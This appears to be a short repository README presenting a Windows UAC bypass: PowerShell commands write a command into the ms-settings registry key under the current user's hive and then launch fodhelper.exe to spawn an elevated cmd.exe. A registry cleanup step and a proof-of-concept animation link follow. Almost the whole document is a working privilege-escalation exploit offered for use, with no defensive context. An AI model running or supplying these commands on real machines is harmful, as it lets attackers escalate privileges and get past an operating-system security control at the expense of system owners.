# Bypass Windows UAC Technique

## Bypass UAC with 3 Commands
```
#spawn cmd.exe process 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

#start fodhelper.exe to execute command in the registry
Start-Process "C:\Windows\System32\fodhelper.exe"
```
### Cleanup the registry value 
```
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

![alt text](poc/poc.gif)
